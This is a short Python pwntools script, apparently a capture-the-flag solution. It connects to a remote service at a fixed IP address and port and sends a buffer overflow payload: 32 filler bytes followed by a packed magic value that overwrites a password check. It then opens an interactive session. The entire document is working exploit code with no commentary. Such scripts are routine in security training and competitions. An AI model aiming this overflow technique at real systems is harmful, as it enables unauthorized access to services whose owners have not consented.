from pwn import *

p = remote("89.38.210.128", 31338)

password = 0xc0defefe
payload = "a"*32 + p32(password)

p.recvuntil("Password: ")
p.sendline(payload)
print p.recv(1024)
p.interactive()